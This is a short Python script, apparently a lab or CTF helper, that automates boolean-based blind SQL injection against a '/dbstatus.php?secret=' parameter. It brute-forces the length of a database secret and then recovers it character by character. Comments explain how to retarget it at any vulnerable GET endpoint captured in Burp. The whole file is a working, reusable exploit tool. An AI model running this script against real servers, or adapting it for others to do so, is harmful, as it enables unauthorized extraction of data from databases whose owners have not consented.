import requests
import sys


# ---------------------------------------------------------------
#   How to use:
#   Capture a vulnerable GET request in Burp or look in the URL bar
#   Change the endpoint and the GET parameters to the vulnerable endpoint and its parameters ie. /dbstatus.php?secret=
#   Change the SQL Query in brute_db function
# ---------------------------------------------------------------


# Send the payload to the vulnerable parameter on the target host
# If OK is found on the webpage -> true response
def send_payload(ip, payload):
    r = requests.get("http://" + ip + "/dbstatus.php?secret=" + payload)
    if r.text.find("OK") != -1:
        return True
    else:
        return False


# Brute-force the length of the data
# Iterate to all possible letters and brute-force the data
def brute_db(ip):
    length = 0
    for i in range(0, 100):
        if send_payload(ip, "'%%20OR%%20LENGTH((select secret from data))= '%d" %i):   # --- CHANGE SQL QUERY
            length = i
            break
    db_name = ''
    for i in range(1, length + 1):
        for j in range(96, 123):
            if send_payload(ip, "%%20OR%%20SUBSTRING((select secret from data),%d,1)='%s" % (i, chr(j))):   # --- CHANGE SQL QUERY
                db_name += chr(j)
    return db_name


def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <ip>" % (sys.argv[0]))
        sys.exit(1)
    ip = sys.argv[1]
    print(brute_db(ip))


if __name__ == "__main__":
    main()